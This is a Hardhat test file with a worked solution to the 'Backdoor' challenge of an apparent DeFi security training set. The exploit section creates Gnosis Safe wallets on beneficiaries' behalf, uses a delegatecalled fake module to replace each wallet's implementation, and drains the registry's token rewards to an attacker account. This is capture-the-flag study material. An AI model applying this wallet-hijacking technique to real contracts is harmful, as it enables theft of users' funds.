const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
  let deployer, users, attacker;

  const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, alice, bob, charlie, david, attacker] =
      await ethers.getSigners();
    users = [
      alice.address,
      bob.address,
      charlie.address,
      david.address,
    ];

    // Deploy Gnosis Safe master copy and factory contracts
    this.masterCopy = await (
      await ethers.getContractFactory('GnosisSafe', deployer)
    ).deploy();
    this.walletFactory = await (
      await ethers.getContractFactory(
        'GnosisSafeProxyFactory',
        deployer
      )
    ).deploy();
    this.token = await (
      await ethers.getContractFactory('DamnValuableToken', deployer)
    ).deploy();

    // Deploy the registry
    this.walletRegistry = await (
      await ethers.getContractFactory('WalletRegistry', deployer)
    ).deploy(
      this.masterCopy.address,
      this.walletFactory.address,
      this.token.address,
      users
    );

    // Users are registered as beneficiaries
    for (let i = 0; i < users.length; i++) {
      expect(await this.walletRegistry.beneficiaries(users[i])).to.be
        .true;
    }

    // Transfer tokens to be distributed to the registry
    await this.token.transfer(
      this.walletRegistry.address,
      AMOUNT_TOKENS_DISTRIBUTED
    );
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    // fake module copy
    this.moduleFake = await (
      await ethers.getContractFactory('ModuleFake', deployer)
    ).deploy();

    let ABI = [
      'function setup(address[] calldata,uint256,address,bytes calldata,address,address,uint256,address payable)',
    ];
    let iface = new ethers.utils.Interface(ABI);

    let ABI2 = ['function setImplementation(address)'];
    let iface2 = new ethers.utils.Interface(ABI2);

    let masterFakes = [];

    for (let i = 0; i < users.length; i++) {
      masterFakes[i] = await (
        await ethers.getContractFactory('GnosisSafeFake', deployer)
      ).deploy(users[i]);

      let tx = await this.walletFactory.createProxyWithCallback(
        this.masterCopy.address,
        iface.encodeFunctionData('setup', [
          [users[i]],
          1,
          this.moduleFake.address,
          iface2.encodeFunctionData('setImplementation', [
            masterFakes[i].address,
          ]),
          ethers.constants.AddressZero,
          ethers.constants.AddressZero,
          0,
          ethers.constants.AddressZero,
        ]),
        1,
        this.walletRegistry.address
      );

      const { events } = await tx.wait();
      this.gnosisProxy = await (
        await ethers.getContractFactory('GnosisSafeFake', deployer)
      ).attach(events[1].args.proxy);

      // const tBal = await this.token.balanceOf(
      //   this.gnosisProxy.address
      // );
      // console.log(tBal.toString());

      await this.gnosisProxy
        .connect(attacker)
        .withdrawToken(this.token.address);
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    for (let i = 0; i < users.length; i++) {
      let wallet = await this.walletRegistry.wallets(users[i]);

      // User must have registered a wallet
      expect(wallet).to.not.eq(
        ethers.constants.AddressZero,
        'User did not register a wallet'
      );

      // User is no longer registered as a beneficiary
      expect(await this.walletRegistry.beneficiaries(users[i])).to.be
        .false;
    }

    // Attacker must have taken all tokens
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      AMOUNT_TOKENS_DISTRIBUTED
    );
  });
});
